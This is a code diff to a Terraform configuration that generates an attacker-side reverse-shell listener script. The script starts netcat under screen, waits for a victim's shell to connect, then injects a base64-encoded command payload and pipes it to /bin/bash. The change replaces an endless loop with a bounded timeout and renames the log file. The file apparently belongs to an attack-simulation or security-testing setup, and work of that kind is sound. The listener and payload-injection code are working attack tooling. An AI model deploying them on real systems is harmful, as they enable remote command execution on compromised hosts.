@@ -4,29 +4,39 @@ locals {
     listen_ip = var.listen_ip
     base64_command_payload = base64encode(var.payload)
     payload = <<-EOT
-    LOGFILE=/tmp/ssm_attacker_exec_reverseshell_listener.log
+    MAX_WAIT=300
+    SECONDS_WAITED=0
+    CHECK_INTERVAL=5
+
+    LOGFILE=/tmp/runbook_attacker_exec_reverseshell_listener.log
     function log {
         echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
         echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
     }
     truncate -s 0 $LOGFILE
     log "listener: ${local.listen_ip}:${local.listen_port}"
-    while true; do
-        screen -ls | grep netcat | cut -d. -f1 | awk '{print $1}' | xargs kill
-        truncate -s 0 /tmp/netcat.log
-        screen -d -L -Logfile /tmp/netcat.log -S netcat -m nc -vv -nl ${local.listen_ip} ${local.listen_port}
-        screen -S netcat -X colon "logfile flush 0^M"
-        log "listener started.."
-        until tail /tmp/netcat.log | grep -m 1 "Connection received"; do
-            log "waiting for connection...";
-            sleep 10;
-        done
-        sleep 30
+    
+    screen -ls | grep netcat | cut -d. -f1 | awk '{print $1}' | xargs kill
+    truncate -s 0 /tmp/netcat.log
+    screen -d -L -Logfile /tmp/netcat.log -S netcat -m nc -vv -nl ${local.listen_ip} ${local.listen_port}
+    screen -S netcat -X colon "logfile flush 0^M"
+    log "listener started.."
+    until tail /tmp/netcat.log | grep -m 1 "Connection received"; do
+        log "waiting for connection...";
+        SECONDS_WAITED=$((SECONDS_WAITED + CHECK_INTERVAL))
+        if [ $SECONDS_WAITED -ge $MAX_WAIT ]; then
+            log "Connection is still not available after waiting for $((MAX_WAIT / 60)) minutes."
+            exit 1
+        fi
+        sleep $CHECK_INTERVAL;
+    done
+    sleep 30
+    if [ $SECONDS_WAITED -le $MAX_WAIT ]; then
         log 'sending screen command: ${var.payload}';
         screen -S netcat -p 0 -X stuff "echo '${local.base64_command_payload}' | base64 -d | /bin/bash -^M"
-        sleep 300
         log "restarting attacker session..."
-    done
+    fi
+    sleep 300
     log "done"
     EOT
     base64_payload = base64encode(local.payload)
